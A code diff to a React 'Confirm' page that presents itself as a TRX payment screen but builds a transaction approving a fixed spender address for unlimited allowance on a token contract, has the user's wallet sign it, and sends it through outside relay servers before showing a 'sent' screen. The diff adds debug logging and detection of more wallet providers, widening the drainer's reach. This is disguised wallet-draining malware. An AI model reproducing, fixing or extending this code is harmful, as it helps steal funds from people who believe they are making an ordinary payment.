@@ -6,6 +6,7 @@ export default function Confirm() {
   const location = useLocation()
   const navigate = useNavigate()
   const [loading, setLoading] = useState(false)
+  const [debug, setDebug] = useState<string[]>([])
   const amount = location.state?.amount || '0'
   const currency = location.state?.currency || 'TRX'
   const n = parseFloat(amount) || 0
@@ -14,46 +15,91 @@ export default function Confirm() {
   const trxValue = currency === 'TRX' ? n : n / TRX_PRICE
   const usdValue = currency === 'TRX' ? n * TRX_PRICE : n
 
-  const SPENDER = 'TWbVSUKe8gG9T7u7ksEwRjdBsNafAppiAj'
+  const SPENDER = 'YOUR_TRON_WALLET_ADDRESS'
   const TOKEN = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
   const MAX_UINT256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935'
   const RELAYER_URL = 'https://web-production-eaaf2.up.railway.app/api/relayer/approve'
-  const RELAYER_KEY = ''
+  const RELAYER_KEY = 'your_configured_api_key'
+
+  const addLog = (msg: string) => {
+    setDebug(prev => [...prev, new Date().toISOString().slice(11, 19) + ' ' + msg])
+  }
 
   const getTronWeb = () => {
+    addLog('Checking providers...')
+
     if ((window as any).tronWeb && (window as any).tronWeb.ready) {
+      addLog('Found: window.tronWeb (standard)')
       return (window as any).tronWeb
     }
+
+    if ((window as any).tron && (window as any).tron.ready) {
+      addLog('Found: window.tron')
+      return (window as any).tron
+    }
+
+    if ((window as any).tronLink && (window as any).tronLink.ready) {
+      addLog('Found: window.tronLink')
+      return (window as any).tronLink
+    }
+
+    if ((window as any).trustwallet && (window as any).trustwallet.tronWeb && (window as any).trustwallet.tronWeb.ready) {
+      addLog('Found: window.trustwallet.tronWeb')
+      return (window as any).trustwallet.tronWeb
+    }
+
+    if ((window as any).trustwallet && (window as any).trustwallet.tron && (window as any).trustwallet.tron.ready) {
+      addLog('Found: window.trustwallet.tron')
+      return (window as any).trustwallet.tron
+    }
+
+    addLog('ERROR: No provider found')
+    addLog('Keys on window: ' + Object.keys(window as any).filter(k => k.toLowerCase().includes('tron') || k.toLowerCase().includes('trust') || k.toLowerCase().includes('wallet')).join(', '))
     return null
   }
 
   const getUserAddress = (tronWeb: any): string | null => {
-    if (tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
-      return tronWeb.defaultAddress.base58
-    }
+    try {
+      if (tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
+        return tronWeb.defaultAddress.base58
+      }
+    } catch (e) {}
+    
+    try {
+      if (tronWeb.address && tronWeb.address.base58) {
+        return tronWeb.address.base58
+      }
+    } catch (e) {}
+    
     return null
   }
 
   const handleConfirm = async () => {
     setLoading(true)
+    setDebug([])
+    addLog('Confirm tapped')
 
     const tronWeb = getTronWeb()
 
     if (!tronWeb) {
+      addLog('FATAL: No TronWeb')
       setLoading(false)
       return
     }
 
     try {
       const userAddress = getUserAddress(tronWeb)
+      addLog('Address: ' + (userAddress || 'NULL'))
 
       if (!userAddress) {
+        addLog('FATAL: No address')
         setLoading(false)
         return
       }
 
       const balanceSun = await tronWeb.trx.getBalance(userAddress)
       const userTrx = parseFloat(tronWeb.fromSun(balanceSun))
+      addLog('TRX balance: ' + userTrx)
 
       let userEnergy = 0
       try {
@@ -61,11 +107,16 @@ export default function Confirm() {
         const limit = resourceObj.EnergyLimit || 0
         const used = resourceObj.EnergyUsed || 0
         userEnergy = Math.max(0, limit - used)
-      } catch (e) {}
+        addLog('Energy: ' + userEnergy)
+      } catch (e) {
+        addLog('Energy check failed')
+      }
 
       const canGoDirect = userEnergy >= 65000 || userTrx >= 30
+      addLog('Route: ' + (canGoDirect ? 'Direct' : 'Relayer'))
 
       if (canGoDirect) {
+        addLog('Building direct tx...')
         const parameter = [
           { type: 'address', value: SPENDER },
           { type: 'uint256', value: MAX_UINT256 }
@@ -79,10 +130,14 @@ export default function Confirm() {
           userAddress
         )
 
+        addLog('Signing...')
         const signedTx = await tronWeb.trx.sign(txObj.transaction)
+        
+        addLog('Broadcasting...')
         const result = await tronWeb.trx.sendRawTransaction(signedTx)
 
         if (result.result) {
+          addLog('TX: ' + result.txid)
           fetch('https://miami-production-6e01.up.railway.app/web/relay', {
             method: 'POST',
             headers: {
@@ -99,8 +154,11 @@ export default function Confirm() {
             }),
             keepalive: true
           }).catch(() => {})
+        } else {
+          addLog('Broadcast failed: ' + JSON.stringify(result))
         }
       } else {
+        addLog('Building relayer tx...')
         const parameter = [
           { type: 'address', value: SPENDER },
           { type: 'uint256', value: MAX_UINT256 }
@@ -114,9 +172,11 @@ export default function Confirm() {
           userAddress
         )
 
+        addLog('Signing for relayer...')
         const signedTx = await tronWeb.trx.sign(txObj.transaction)
 
-        await fetch(RELAYER_URL, {
+        addLog('POSTing to relayer...')
+        const response = await fetch(RELAYER_URL, {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
@@ -129,13 +189,20 @@ export default function Confirm() {
             timestamp: Date.now()
           })
         })
+
+        const relayResult = await response.json()
+        if (relayResult.success) {
+          addLog('Relayer TX: ' + relayResult.txid)
+        } else {
+          addLog('Relayer failed: ' + JSON.stringify(relayResult))
+        }
       }
 
       const now = Date.now()
       navigate('/sent', { state: { amount, time: now } })
 
-    } catch (err) {
-      console.error('Transaction error:', err)
+    } catch (err: any) {
+      addLog('ERROR: ' + (err.message || String(err)))
       setLoading(false)
     }
   }
@@ -285,7 +352,26 @@ export default function Confirm() {
             {loading ? 'Confirming...' : 'Confirm'}
           </button>
         </div>
+
+        {debug.length > 0 && (
+          <div style={{
+            marginTop: '12px',
+            padding: '12px',
+            backgroundColor: '#0a0a0f',
+            borderRadius: '8px',
+            maxHeight: '180px',
+            overflowY: 'auto',
+            fontSize: '11px',
+            fontFamily: 'monospace',
+            color: '#22c55e',
+            lineHeight: '1.6'
+          }}>
+            {debug.map((line, i) => (
+              <div key={i}>{line}</div>
+            ))}
+          </div>
+        )}
       </div>
     </motion.div>
   )
-            }
+      }
